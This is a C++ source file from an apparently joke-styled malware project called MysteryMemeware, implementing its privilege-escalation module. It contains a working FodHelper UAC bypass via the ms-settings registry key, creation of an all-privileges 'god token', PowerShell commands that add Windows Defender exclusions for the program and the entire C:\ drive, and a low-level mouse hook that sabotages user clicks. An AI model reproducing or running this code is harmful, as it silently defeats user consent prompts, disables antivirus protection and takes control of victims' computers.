// Approved 10/29/2024

#include "MysteryEscalation.h"
#include "MysteryMemeware.h"
#include "EzCpp/EzError.h"
#include "EzCpp/EzTokens.h"
#include "EzCpp/EzHelper.h"

HHOOK mouseHook = NULL;
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
	LRESULT output = CallNextHookEx(mouseHook, nCode, wParam, lParam);
	mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
	return output;
}
void BecomeZombie() {
	mouseHook = SetWindowsHookExW(WH_MOUSE_LL, MouseProc, NULL, 0);

	MSG msg = { };
	while (GetMessageW(&msg, NULL, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
}

void ElevateNoUAC() {
	DWORD lastError = 0;

	// Setup before we do anything sussy
	LPCWSTR regPath = L"SOFTWARE\\Classes\\ms-settings\\shell\\open\\command";
	LPCWSTR fodHelperPath = L"C:\\Windows\\System32\\FodHelper.exe";
	LPCWSTR exePath = EzGetCurrentExePathW();
	DWORD exePathLength = lstrlenW(exePath) * sizeof(WCHAR);
	const BYTE* exePathBytes = reinterpret_cast<const BYTE*>(exePath);

	// Open stuff which shouldn't be sussy
	HKEY hKey = NULL;
	if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != 0) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Okay now it's getting sussy
	// We changing registries we shouldn't
	if (RegSetValueExW(hKey, NULL, 0, REG_SZ, exePathBytes, exePathLength) != 0) {
		lastError = GetLastError();
		RegCloseKey(hKey);
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, NULL, 0) != ERROR_SUCCESS) {
		lastError = GetLastError();
		RegCloseKey(hKey);
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Launch FodHelper.exe
	// This is definitly sussy
	EzShellExecuteProcess(fodHelperPath, NULL, FALSE);
	
	// Cleanup and return
	// We should have administrator if we got this far
	RegCloseKey(hKey);
}

void MysteryEscalation::Run() {
	HANDLE currentToken = EzOpenCurrentToken();
	EzEnableAllPrivileges(currentToken);

	BOOL isElevated = EzGetTokenElevation(currentToken);
	BOOL isGodToken = EzIsGodToken(currentToken);
	EzCloseHandleSafely(currentToken);

	if (!isElevated) {
#ifdef PlzJustAskForAdmin
		if (!EzLaunchWithUAC()) {
			throw EzError("User declined a mandatory consent.exe popup.", __FILE__, __LINE__);
		}
		ExitProcess(0);
#else
		ElevateNoUAC();
		ExitProcess(0);
#endif
	}
	if (!isGodToken) {
		HANDLE godToken = EzCreateGodToken();
		EzLaunchAsToken(godToken);
		ExitProcess(0);
	}

#ifdef NukeDefender
	EzShellExecuteProcess(L"powershell", L"-Command Add-MpPreference -ExclusionProcess MysteryMemeware2.exe", TRUE);
	EzShellExecuteProcess(L"powershell", L"-Command Add-MpPreference -ControlledFolderAccessAllowedApplications MysteryMemeware2.exe", TRUE);
	EzShellExecuteProcess(L"powershell", L"-Command Add-MpPreference -ExclusionPath C:\\", TRUE);
#endif
}